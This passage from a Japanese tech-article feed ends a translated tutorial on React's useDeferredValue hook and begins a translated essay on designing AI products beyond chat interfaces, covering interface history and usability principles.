<p>Reactには使用可能な前回値がないため、ここで説明したような二重レンダリングは行いません。したがって、実質的に<code class="language-text">useDeferredValue</code>は最初のレンダリングに対しては効果がないのです。
しかし、React 19からは初期値を指定できるようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> deferredCount <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span> initialValue<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p><strong>なぜそうする必要があるのでしょうか？</strong>このパターンでは、最初のレンダリングを高速化できる可能性があります。</p>
<p>例えば、Shadow Palette Generatorを使用して次のようなことができます。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> cssCode <span class="token operator">=</span> <span class="token function">generateShadows</span><span class="token punctuation">(</span>oomph<span class="token punctuation">,</span> crispy<span class="token punctuation">,</span> backgroundColor<span class="token punctuation">,</span> tint<span class="token punctuation">,</span> resolution<span class="token punctuation">,</span> lightPosition<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> deferredCssCode <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>
  cssCode<span class="token punctuation">,</span>
  <span class="token keyword">null</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token punctuation">(</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token punctuation">{</span><span class="token comment">/* Other stuff omitted for brevity */</span><span class="token punctuation">}</span><span class="token plain-text">
    </span><span class="token punctuation">{</span>deferredCssCode <span class="token operator">!==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">CodeSnippet</span></span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css<span class="token punctuation">"</span></span> <span class="token attr-name">code</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>deferredCssCode<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span>
    <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>優先度の高い高速レンダリングでは、<code class="language-text">deferredCssCode</code>は<code class="language-text">null</code>となるため、<code class="language-text">&lt;CodeSnippet></code>はレンダリングすらされません。しかし、高速レンダリングが終わると、すぐにこのコンポーネントの再レンダリングが自動的に行われ、枠にコードが表示されます。</p>
<p>重要度の低いUI要素を待つ必要がないため、アプリケーション全体としてはレスポンスが向上するはずです。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p><strong>Reactのドキュメント</strong> <br>
このチュートリアルでは、useDeferredValueの主なユースケースの一つについて説明しましたが、Suspenseに対応したデータ取得ライブラリを使用する場合など、他にも役立つ場面があるでしょう。詳しくは<a href="https://react.dev/reference/react/useDeferredValue">Reactの公式ドキュメント</a>をご覧ください。</p></div></div>
<h2>劇的な変化</h2>
<p>それでは、<code class="language-text">useDeferredValue</code>フックを使用した場合の結果を見てみましょう。</p>
<p><video autoplay="" loop="" muted="" playsinline="" src="https://www.joshwcomeau.com/videos/use-deferred-value/shadow-palette-smooth.mp4"></video></p>
<p>最高です！何もかも非常に滑らかです。💯</p>
<p>でもちょっと待ってください。筆者がテストに使用しているのは高性能なMacBook Proです。より性能の低いデバイスではどうでしょうか？</p>
<p>数年前、近所のPCショップで一番安い新品のWindowsノートパソコンを買いたいと言ったところ、インテルCeleronプロセッサーを搭載した110米ドルのAcer製ノートパソコンを引っ張り出してきてくれました。このマシンを使用し、<code class="language-text">useDeferredValue</code>を実装した状態で動かすとこうなります。</p>
<p><video autoplay="" loop="" muted="" playsinline="" src="https://www.joshwcomeau.com/videos/use-deferred-value/shadow-palette-celeron.mp4"></video></p>
<p>さっきほど滑らかではありませんが、スタートメニューを開くのさえ時間がかかるマシンにしては悪くありません。コントロールの操作を終えるまでコードスニペットが更新されない点に注目してください。ここでは<code class="language-text">useDeferredValue</code>が大いに役立っています。</p>
<hr>
<p>Reactの多くの点について言えることですが、適切なメンタルモデルで臨まなければ<code class="language-text">useDeferredValue</code>は非常に複雑に感じられます。Reactは非常に洗練されたツールへと進化を遂げてきましたが、効果的に使いこなすためには、その仕組みを直感的に理解できるようになる必要があります。</p>
<p>筆者は2年近くかけてReactについて学べる究極のリソースを作り上げました。その名も<a href="https://www.joyofreact.com/">The Joy of React</a>です。仕事で10年近くReactを使ってきた経験から得た知識を全て網羅しています。</p>
<p>もしこのブログ記事が役に立ったと感じていただけたなら、筆者のコースから得られるものは多いと思います。このコースは、多くの気づきが得られ、Reactの仕組みに関する強力なメンタルモデルを形成でき、Reactを使用して豊かでダイナミックなWebアプリケーションを構築する方法を学べる内容となっています。</p>
<p><a href="https://www.joyofreact.com/"><img src="https://www.joshwcomeau.com/_next/image/?url=%2Fimages%2Fjoy-of-react.png&#x26;w=1920&#x26;q=75" alt="(https://www.joyofreact.com/)"></a></p>
<p>コースに関する詳細は以下をご覧ください。</p>
<ul>
<li><a href="https://joyofreact.com/">The Joy of React</a></li>
</ul>
<p>最後まで読んでいただきありがとうございました！ 💖</p>]]></content:encoded></item><item><title><![CDATA[言葉で説明できないとき：対話型インターフェースを超えるAIのためのデザイン]]></title><description><![CDATA[クイックサマリー：人工知能がコンピューティングパラダイムの進化をもたらしており、それに伴いデザイナーはより直感的なユーザーインターフェースを開発するチャンスに恵まれています。新しい機能のほとんどは、…]]></description><link>https://postd.cc/designing-ai-beyond-conversational-interfaces/</link><guid isPermaLink="false">https://postd.cc/designing-ai-beyond-conversational-interfaces/</guid><category><![CDATA[生成AI]]></category><category><![CDATA[UIデザイン]]></category><category><![CDATA[UXデザイン]]></category><pubDate>Fri, 21 Jun 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p><strong>クイックサマリー</strong>：人工知能がコンピューティングパラダイムの進化をもたらしており、それに伴いデザイナーはより直感的なユーザーインターフェースを開発するチャンスに恵まれています。新しい機能のほとんどは、テキストベースの大規模言語モデルによって実現されているため、グラフィカルインターフェースからチャットボットのような対話型インターフェースへの移行が必要との声が多く聞かれるようになっています。しかし、多くのインタラクションパターンにおいて、対話は優れたインターフェースではないことをかなりの証拠が示しています。最新のAI機能によって、対話だけにとどまらずヒューマンコンピューターインタラクションの未来がどう変わりうるのか、マクシミリアン・ピラスが考察します。</p>
<hr>
<p>人間とコンピューターのインタラクションのあり方を根本から変えうるような技術革新はそうそうありません。幸運なことに、次のパラダイムシフトは今まさに私たちの目の前で展開されているようです。</p>
<p>こうした変化は、新たな抽象化レイヤーを解放し、サブシステムの詳細な仕組みを覆い隠す傾向にあります。詳細を一般化することで、複雑なシステムをより単純で直感的なものとして見せることができます。それにより、コンピュータープログラムのコーディングや、コンピューターを操作するためのインターフェースの設計が合理化されます。</p>
<p>例えば、<strong>コマンドラインインターフェース</strong>は抽象化レイヤーを作り出し、格納されたプログラムによるインタラクションを可能にしました。その結果、スイッチを用いて1と0を入力することでしかプログラミングできなかった以前のコンピューターではあらわになっていたサブシステムの詳細が見えなくなりました。</p>
<p><strong>グラフィカルユーザーインターフェース（GUI）</strong> は、視覚的メタファーを用いてコンピューターを操作できるようにすることで、この概念をさらに抽象化しました。これらの抽象概念により、コンピューターは大勢の一般ユーザーにも使えるものになりました。</p>
<p>こうした進歩を遂げてきたものの、まだ完璧に直感的なインターフェースは見つかっていません。インターネット上に公開されている大量の関連論文からもそれは明らかです。しかし、近年見られるAIの進歩を受け、多くの技術者はコンピューティングの次なる進化のサイクルが始まっていると確信しています。</p>
<p><img src="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/1-smashing-abstraction-intro.gif"></p>
<p><em>インターフェースの抽象化レイヤー（下から上）：コマンドラインインターフェース、グラフィカルユーザーインターフェース、AI搭載の対話型インターフェース。（出典：<a href="https://www.maximillian.nyc/">マクシミリアン・ピラス</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/1-smashing-abstraction-intro.gif">拡大プレビュー</a>）</em></p>
<h2>次のインターフェース抽象化レイヤー <a href="#次のインターフェース抽象化レイヤー">#</a><a name="次のインターフェース抽象化レイヤー"></a></h2>
<p>近年のイノベーションの大半は、機械学習の一種である<strong>生成AI</strong>によって推進されています。データセット内のパターンを認識し、確率分布を推定することで、テキストやメディア、コードの斬新な構成を可能にします。コンピューターの制御がさらに簡単になることから、「グラフィカルユーザーインターフェース以来最も重要なテクノロジーの進化」であると<a href="https://www.gatesnotes.com/The-Age-of-AI-Has-Begun">ビル・ゲイツ氏は語っています</a>。自然言語のような非構造化データを解釈する能力を新たに手に入れたことで、これまでにない形の入出力が可能になり、<a href="https://twitter.com/AviSchiffmann/status/1708439854005321954">今までにない</a> <a href="https://www.youtube.com/watch?v=9lNIwOOMVHk">斬新な</a> <a href="https://www.youtube.com/watch?v=Yla0f5JZg78">物理仕様</a>を実現できるようになりました。</p>
<p>今では、人間同士で話すように直感的なインターフェースを通して即座に膨大な量の情報を呼び出せるようになりました。これらは『スタートレック』に登場する「データ（※訳注：劇中に登場するアンドロイドキャラクター）」に搭載されたシステムのような、私たちが夢見てきたSF世界のコンピューターです。もしかすると、これまでのコンピューターは試作品に過ぎず、これから出てくるのが本当の製品なのかもしれません。<strong>インターネットの構築が線路を敷く行為だと仮定すると、AIは猛スピードで情報を運ぶ列車かもしれません</strong>。これらの列車がものすごいスピードで街に入ってくるとどうなるか、これから目の当たりにすることになるでしょう。</p>
<blockquote>
<p>「画面をタップするのではなくコマンドプロンプトを入力してコンピューターを使っていた日々のようにAI以前の時代はもうすぐ遠い過去に感じられるようになるでしょう」<br>
— ビル・ゲイツ、『<a href="https://www.gatesnotes.com/The-Age-of-AI-Has-Begun">The Age of AI Has Begun（AIの時代が始まった）</a>』</p>
</blockquote>
<p>今後何もかも変わるのであれば、ソフトウェアデザイナーのメンタルモデルも変わらなくてはいけません。<a href="https://www.lukew.com/ff/entry.asp?933">ルーク・ウルブレフスキー氏</a>がかつてモバイルファーストデザインを普及させたように、次のトレンドはAIファーストになるでしょう。AIの制約と能力を理解することで、初めて人に喜ばれるものを作れます。インターフェースの進化に関する議論にはすでに影響を与え始めています。</p>
<p>例えば、大規模言語モデル（LLM）は多くの新しいアプリケーションで使われているAIで、テキストベースであるため、将来的にはチャットボットのような対話型インターフェースが適していると多くの人が考えています。AIが語りかける対象であるという考え方は、<a href="https://www.wired.com/2013/03/conversational-user-interface/">何年も前から業界内で広がっています</a>。『UXマガジン』誌の共同オーナーであるロブ・ウィルソン氏は、著書『The Age of Invisible Machines（透明な機械の時代）』（2022年）の中で、対話は「無限に拡張可能なインターフェース」であると語っています。<a href="https://www.designerfund.com/blog/how-figma-midjourney-and-databricks-harness-ai-in-design/">フィグマ社のプロダクトデザイン担当バイスプレジデントであるノア・レヴィン氏</a>は、「対話の仕方を学ぶというのは、非常に直感的なものである」と述べています。GUIの先駆者である<a href="https://www.gatesnotes.com/The-Age-of-AI-Has-Begun">ビル・ゲイツ氏</a>でさえ、「カーソルを合わせてクリックするというコンピューターの制御方法は、今後主流ではなくなります」と断言しています。</p>
<p><img src="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/2-smashing-abstraction-mscopilot-800px.gif"></p>
<p><em>Microsoft Copilotは、マイクロソフト社のオフィススイート全体への統合が進められている新しい対話型AI機能です。（出典：<a href="https://www.microsoft.com/en-us/microsoft-365/blog/2023/03/16/introducing-microsoft-365-copilot-a-whole-new-way-to-work/">マイクロソフト社</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/2-smashing-abstraction-mscopilot.gif">拡大プレビュー</a>）</em></p>
<p>対話型コンピューターにより、学習曲線が平坦化することが望まれています。<a href="https://www.rabbit.tech/keynote">ラビット社の創設者であるジェシー・リュー氏</a>は、自然言語によるアプローチは「使い方を学ぶ必要がないほど直感的」だと言います。</p>
<p>『スタートレック』の「データ」も取扱説明書が付いてきたわけではありません。その観点で言うと、GUIに取って代わる対話型インターフェースの<a href="https://www.shopify.com/partners/blog/conversational-interfaces">進化の物語</a>も必然的であるように感じられ、過去に見られたコマンドラインからの転換を彷彿させます。しかし、チャットボットのような対話型インターフェースを「怠惰な解決策」とまで呼ぶ<a href="https://maggieappleton.com/lm-sketchbook">マギー・アップルトン氏</a>のように、<a href="https://wattenberger.com/thoughts/boo-chatbots">異論</a>を唱える者もいます。</p>
<p>一見すると意見が分裂しているように見えるかもしれませんが、むしろインターフェースの進化を単純に捉え過ぎた結果だと言えるでしょう。コマンドラインは決して廃れてなどいません。柔軟性や効率性に優れるため、技術者は今でも好んで使用しています。ソフトウェア開発や自動化スクリプトの作成などのユースケースの場合、コードを使用しないグラフィカルツールにおいて追加された抽象化レイヤーは、橋渡しどころか障壁となることがあります。</p>
<blockquote>
<p><a class="pull-quote__link" aria-label="Share on Twitter" href="https://twitter.com/share?text=%0aGUIs%20were%20revolutionary%20but%20not%20a%20panacea.%20Yet%20there%20is%20ample%20research%20to%20suggest%20conversational%20interfaces%20won%e2%80%99t%20be%20one,%20either.%20For%20certain%20interactions,%20they%20can%20decrease%20usability,%20increase%20cost,%20&%20introduce%20security%20risk%20relative%20to%20GUIs.%0a%0a&url=https://smashingmagazine.com%2f2024%2f02%2fdesigning-ai-beyond-conversational-interfaces%2f">GUIは革命的ではありましたが、万能薬ではありませんでした。多くの研究結果が、対話型インターフェースも万能薬にはならないことを示しています。インタラクションによっては、GUIに比べて使い勝手が損なわれ、コストが増し、セキュリティリスクがもたらされる可能性があります。</a></p>
</blockquote>
<p>（訳注：原文同様 XへのPOSTリンクとなっています）</p>
<p><strong>では、人工知能を搭載したアプリケーションにはどのようなインターフェースが適しているのでしょうか？</strong>この記事では、インターフェースとしての対話の可能性と制約を比較することで、その判断を下すのに必要な情報を提供します。</p>
<h2>ピクセルをつなぐ <a href="#ピクセルをつなぐ">#</a><a name="ピクセルをつなぐ"></a></h2>
<p>過去を振り返ることから始めるのが、未来を知るための鍵になることが多いため、まずは歴史的背景から見ていきましょう。対話型インターフェースは新しいもののように感じられますが、実はコンピューターと会話することは何十年も前から可能でした。</p>
<p>世界初のチャットボットである<a href="https://en.wikipedia.org/wiki/ELIZA">ELIZA</a>は、ジョセフ・ワイゼンバウム氏が1966年にMITで行った実験によって発明されました。これが、音声アシスタントのAlexaや、電話の自動音声応答など、以後何世代にもわたる言語モデルの基礎を築いたのです。しかし、チャットボットの大半は、<a href="https://www.theverge.com/2021/12/23/22851451/amazon-alexa-by-the-way-use-case-functionality-plateaued">タイマーをセットするといった基本的な作業</a>にしか使われず、それ以上の用途を与えられることはほとんどありませんでした。</p>
<p>ほとんどの消費者は、さほどコンピューターと対話したいとは思っていないようでした。しかし、昨年何かが変わったようです。<a href="https://www.cnet.com/tech/computing/why-were-all-obsessed-with-the-mind-blowing-chatgpt-ai-chatbot/">CNETの記事</a>では、「72%の人がチャットボットは時間の無駄と考えている」と報じられていたにもかかわらず、<a href="https://techcrunch.com/2023/11/06/openais-chatgpt-now-has-100-million-weekly-active-users/">ChatGPTの1週間のアクティブユーザー数が1億人に達した</a>のです。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_2000/https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/3-abstraction-eliza.png"></p>
<p><em>1966年に発明された世界初のチャットボットELIZAとの会話。（画像出典：<a href="https://en.wikipedia.org/wiki/ELIZA">ウィキペディア</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/3-abstraction-eliza.png">拡大プレビュー</a>）</em></p>
<p>不毛と見られていたチャットボットの驚くべき躍進をもたらしたものは何でしょうか？多くの専門家がその要因として挙げるのが、<a href="https://cdn.openai.com/research-covers/language-unsupervised/language_understanding_paper.pdf">OpenAI社が2018年に発明</a>（PDF）した<strong>GPT（Generative Pre-trained Transformer</strong>）です。GPTは、自然言語の理解力が大幅に改善した新しいタイプのLLMです。しかし、GPTの中核にあるのは、それ以前の<a href="https://arxiv.org/pdf/1706.03762.pdf">2017年に紹介されたTransformerアーキテクチャの技術革新</a>（PDF）です。このアーキテクチャにより、自然言語の入力の前後にある長期間にわたる文脈を捕捉するために必要な並行処理が可能になりました。さらに掘り下げると、このアーキテクチャが可能なのは、<a href="https://arxiv.org/pdf/1409.0473.pdf">2014年に紹介された注意機構</a>（PDF）のおかげです。これにより、入力の異なる部分を選択的に比較検討することが可能になりました。</p>
<p>こうした相補的な技術革新を組み合わせることで、対話型インターフェースはより幅広い作業でGUIと競い合える存在になったのです。GUIがコマンドラインの有望な代替技術として実用化された際も、驚くほど類似した経過をたどっています。もちろん、キーストロークを超えるユーザーシグナルを捕捉するにはマウスのようなハードウェアが必要であり、十分な解像度の画面も必要でした。しかし、研究者らは何年も後になってビットマップを発明したことで、欠けていたソフトウェアの要素を発見したのでした。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/4-abstraction-sketchpad.png"></p>
<p><em>1963年にSketchpadのグラフィカルユーザーインターフェースを使用するアイバン・サザランド氏。（画像出典：<a href="https://www.researchgate.net/figure/Ivan-E-Sutherland-al-lavoro-con-il-suo-sistema-di-disegno-Sketchpad-ca-1963-da-Blau_fig2_310004778">ResearchGate</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/4-abstraction-sketchpad.png">拡大プレビュー</a>）</em></p>
<p>ビットマップは、以前のベクターディスプレイが苦手とした複雑なピクセルパターンを可能にしました。例えば、アイバン・サザランド氏が発明したSketchpadは初めてのGUIでしたが、ウィンドウの重なりといった概念には対応できませんでした。『IEEEスペクトラム』誌の「<a href="https://spectrum.ieee.org/graphical-user-interface">Of Mice and Menus（マウスとメニュー）</a>」（1989年）に、ゼロックス社パロアルト研究所のアラン・ケイ氏率いるグループによるビットマップの発明につながった進歩について記されています。この新しいテクノロジーにより、革命的な<a href="https://en.wikipedia.org/wiki/WIMP_(computing)">WIMP（ウィンドウ、アイコン、メニュー、ポインター）</a>パラダイムが可能になり、直感的な視覚的メタファーを通じて誰もがパソコンを使える時代の到来を後押ししました。</p>
<p>コンピューティングには、あらかじめ考えられた一連のステップを最初に用意しておく必要がなくなりました。後から考えると些細なことのように思えるかもしれませんが、1963年に<a href="https://www.youtube.com/watch?v=6orsmFndx_o">MITでSketchpadのデモ</a>が行われた際、発表者らはすでに人工知能システムに言及していました。これは、<strong>精巧な計算機が探索ツールへと変貌を遂げた転換点となりました</strong>。これにより、デザイナーは発見に対するニーズが、コマンドラインがもたらす柔軟性や効率性に対するニーズを上回る体験のためにインターフェースを設計できるようになりました。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_2000/https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/5-abstraction-susankare.png"></p>
<p><em>スーザン・ケア氏による、アップル社のGUIにおけるポインターアイコンの初期のスケッチ。（画像出典：<a href="https://www.itsnicethat.com/news/susan-kare-apple-macintosh-icons-california-designing-freedom-design-museum-240517">It’s Nice That</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/5-abstraction-susankare.png">拡大プレビュー</a>）</em></p>
<h2>並行するパラダイム <a href="#並行するパラダイム">#</a><a name="並行するパラダイム"></a></h2>
<p>新しいインターフェースが登場する度に、既存の技術に対して斬新な調整を行うことで一般ユーザーに受け入れられてきました。言うなれば、サンデーにさくらんぼを乗せるようなものです。いずれの場合も、土台のシステムはすでに存在していましたが、データ処理に関して異なる判断を下すことで出力が意義深いものとなり、技術者以外の一般ユーザーを惹きつけました。</p>
<p>ビットマップでは、GUIはピクセルをグリッドの並びに整理し、複雑なスキュアモーフィック構造を生み出すことができます。GPTでは、対話型インターフェースは非構造化データセットを整理し、人間のような（あるいは人間を超える）知性で応答を作成することができます。</p>
<p>どちらのパラダイムも原型となるインターフェースは1960年代に発明されていますが、その後の開発の進行には時系列的に大きな差が開きました。それ自体一つのケーススタディになりそうですが、<strong>ここでもう一つの転換点が訪れます。すなわち、計算機や探索ツールとしてだけでなく、コンピューターは生き物のように振る舞うこともできるのです</strong>。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/6-abstraction-movie-her.png"></p>
<p><em>ジェフ・マクフェトリッジ氏による、映画『her/世界でひとつの彼女』に登場する対話型インターフェースの初期のスケッチ。（画像出典：<a href="https://gizmodo.com.au/2014/03/an-interview-with-geoff-mcfetridge-on-the-interfaces-from-her/">ギズモード</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/6-abstraction-movie-her.png">拡大プレビュー</a>）</em></p>
<p>しかし、グラフィカルインターフェースより対話型インターフェースが求められるようなニーズとはどのようなものでしょうか？主人公がデジタルアシスタントに恋する映画『her/世界でひとつの彼女』の中で、他者との交わりに対する欲求に対する理論的解決策が見られます。しかし、生身の人間との関係に満足している人にとってのメリットは何でしょうか？<strong>対話がより直感的なインターフェースである</strong>との仮定の検証に期待しましょう。WIMPパラダイムの中核的要素のいくつかは十分に裏付けられたユーザビリティの問題があるため、この仮定には妥当性があるように思われます。</p>
<p><a href="https://www.nngroup.com/articles/icon-usability/">ニールセン・ノーマン・グループ</a>のレポートによると、文化的違いにより、アイコンが万国共通の認識を得ることはほとんどないようです。メニューは時間とともに必然的に複雑性が増し、徐々に使い物にならなくなります。対話型インターフェースの場合、混乱して分からなければシステムにそう伝えればいいだけなので、より使い勝手は良さそうです。しかし、この後のセクションで見ていくように、対話型インターフェースにもユーザビリティの問題はあります。</p>
<blockquote>
<p><a class="pull-quote__link" aria-label="Share on Twitter" href="https://twitter.com/share?text=%0aBy%20replacing%20menus%20with%20input%20fields,%20we%20must%20wonder%20if%20we%e2%80%99re%20trading%20one%20set%20of%20usability%20problems%20for%20another.%0a&url=https://smashingmagazine.com%2f2024%2f02%2fdesigning-ai-beyond-conversational-interfaces%2f">メニューを入力欄に置き換えることで、ユーザビリティに関する問題の中身が変わるだけではないのか、考える必要があります。</a></p>
</blockquote>
<p>（訳注：原文同様 XへのPOSTリンクとなっています）</p>
<h2>対話のコスト <a href="#対話のコスト">#</a><a name="対話のコスト"></a></h2>
<p>SF映画の中で対話型インターフェースの人気が高いのはなぜでしょうか？<a href="https://rhizome.org/editorial/2014/feb/03/ill-send-os-world-her-product-spec/">Rhizomeに掲載されたエッセー</a>の中で、マーティン・シムス氏は対話型インターフェースが「より映画的なやりとりや制作のスリム化」に役立つと論じています。同じ費用対効果はアプリケーションの開発にも当てはまります。書き言葉または話し言葉による文章補完はLLMの中核的機能です。これにより、デザインおよび技術的観点から対話がこの機能を製品化する最も簡単な方法となっています。</p>
<p>著名なAIリサーチエンジニアであるライナス・リー氏は、「アルゴリズムの生のインターフェースをあらわにする」ものだと<a href="https://thesephist.com/posts/latent/">述べています</a>。インタラクションのパターンや構成要素はすでにほとんど定義されているため、新たに発明するものはあまりありません。すべてチャットウィンドウに盛り込むことができます。</p>
<blockquote>
<p>「エンジニアまたはデザイナーとして、これらのモデルの力をソフトウェアのインターフェースに組み込む作業を課せられたのであれば、この機能をUIに実装する最も簡単で自然な方法は、対話型インターフェースでしょう」<br>— ライナス・リー氏、「<a href="https://thesephist.com/posts/latent/">Imagining Better Interfaces to Language Models</a>（言語モデルのより良いインターフェースについて考える）」</p>
</blockquote>
<p>このことは、<a href="https://www.theatlantic.com/technology/archive/2023/11/sam-altman-open-ai-chatgpt-chaos/676050/?gift=bQgJMMVzeo8RHHcE1_KM0WVuODpKll0A708pOI0Ple4&#x26;utm_source=copy-link&#x26;utm_medium=social&#x26;utm_campaign=share">ChatGPTの発表に関するアトランティック誌のレポート</a>が「目立たないリサーチプレビュー」として扱われたことでも証明されています。OpenAI社が製品化することをためらっていたことは、ユーザーエクスペリエンスに対する自信の欠如を示すものです。社内の期待値は極めて低く、社員が予想した1週目の採用者数で最も高かったのは10万人でした（実際のユーザー数はこの数を90%上回りました）。</p>
<blockquote>
<p><a class="pull-quote__link" aria-label="Share on Twitter" href="https://twitter.com/share?text=%0aConversational%20interfaces%20are%20cheap%20to%20build,%20so%20they%e2%80%99re%20a%20logical%20starting%20point,%20but%20you%20get%20what%20you%20pay%20for.%20If%20the%20interface%20doesn%e2%80%99t%20fit%20the%20use%20case,%20downstream%20UX%20debt%20can%20outweigh%20any%20upfront%20savings.%0a&url=https://smashingmagazine.com%2f2024%2f02%2fdesigning-ai-beyond-conversational-interfaces%2f">対話型インターフェースは開発コストが安いため、スタート地点として理にかなってはいますが、金額相応のものしか得られません。インターフェースがユースケースに合わなければ、先行投資を節約できてもUX面での負債がそれを上回る可能性があります。</a></p>
</blockquote>
<p>（訳注：原文同様 XへのPOSTリンクとなっています）</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/7-abstraction-llmwrapper.png"></p>
<p><em>LLMの生の出力を対話型インターフェースに表示するのがいかに簡単であるかを示す例。（画像出典：<a href="https://www.maximillian.nyc/">マクシミリアン・ピラス</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/7-abstraction-llmwrapper.png">拡大プレビュー</a>）</em></p>
<h2>忘れられたユーザビリティの原則 <a href="#忘れられたユーザビリティの原則">#</a><a name="忘れられたユーザビリティの原則"></a></h2>
<p><a href="https://www.bloomberg.com/news/articles/1998-05-25/steve-jobs-theres-sanity-returning">スティーブ・ジョブズ氏はかつてこう言いました</a>。「人は形にして見せてもらうまで、自分は何が欲しいのか分からないものだ。」この考え方をインターフェースに当てはめると、発見可能性と呼ばれるユーザビリティの評価と一致します。<a href="https://www.nngroup.com/articles/navigation-ia-tests/">ニールセン・ノーマン・グループ</a>は、これをユーザーが「知らなかった新しいコンテンツや機能を見つけられる」ことと定義しています。</p>
<p>優れた設計のインターフェースは、存在する機能をユーザーが見つけやすくします。今日人気のある多くの生成AIアプリケーションのインターフェースは、ユーザーが任意のシステムプロンプトを入力できる入力欄が中心となっています。問題は、ユーザーが望む出力を得るためには何を入力すればいいのかが不明な場合が多いことです。皮肉なことに、理論的な<a href="https://www.forbes.com/sites/forbesagencycouncil/2023/07/20/generative-ai-and-solving-the-blank-page-problem/">ライターズブロックの解決策</a>自体、空白ページ問題があるかもしれません。</p>
<blockquote>
<p>「AIは、ユーザーインターフェースが欠けていることに問題があるように思います。ほとんどの場合、空白の入力欄が用意されているだけであり、AIに何ができるのかは自分で見つけなくてはいけません」<br>— ケイシー・ニュートン氏、ハード・フォーク・ポッドキャスト</p>
</blockquote>
<p>対話型インターフェースは、人と人とのインタラクションの模倣には優れていますが、それ以外の点では不十分な場合もあります。例えば、「Midjourney」という人気の画像生成AIは、当初テキスト入力のみに対応していましたが、現在は「使いやすさ向上」のため<a href="https://www.zdnet.com/article/later-discord-midjourney-ai-tool-is-moving-to-dedicated-website/">GUIに移行しています</a>。</p>
<p>これは、この新たな未開の領域を進む上で、ドン・ノーマン氏の重要な著書『The Design of Everyday Things』（1988年）に書かれているように、古典的な人間中心の原則を忘れてはならないということを思い出させてくれます。明確なアフォーダンスとシグニファイアを提供することで発見可能性を高めよというノーマン氏のアドバイスには、今でもグラフィカルな構成要素の方が適しているように思われます。</p>
<p>また、ヤコブ・ニールセン氏が提唱する<a href="https://www.nngroup.com/articles/ten-usability-heuristics/">ユーザビリティ10原則</a>もあります。今日の対話型インターフェースの多くは、これらの原則をすべて無視しているように見えます。システムの状態を可視化することで、ユーザーに対して自らの行為の結果について認識させることができると述べた<strong>1つ目のユーザビリティ原則</strong>について考えてみてください。比喩的な地図上の「現在地」ピンを使用することで、適切な方向付けが次のステップを踏み出す上で重要であることを説明しています。</p>
<p>インタラクションはすべて同じチャットウィンドウ上で行われますが、<strong>ナビゲーションはチャットボットのような対話型インターフェースにとって見かけ以上に重要です</strong>。ChatGPTのような製品のバックエンドは、ニューラルネットワーク全体をナビゲートし、訓練データセットの異なる部分に注目することで各回答を作成します。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/8-abstraction-roleplay.png"></p>
<p><em>プロンプトエンジニアリングにおけるロールプレイがAIモデルを大まかに導き、異なる出力を作成する方法を可視化した図。
（画像出典：<a href="https://www.maximillian.nyc/">マクシミリアン・ピラス</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/8-abstraction-roleplay.png">拡大プレビュー</a>）</em></p>
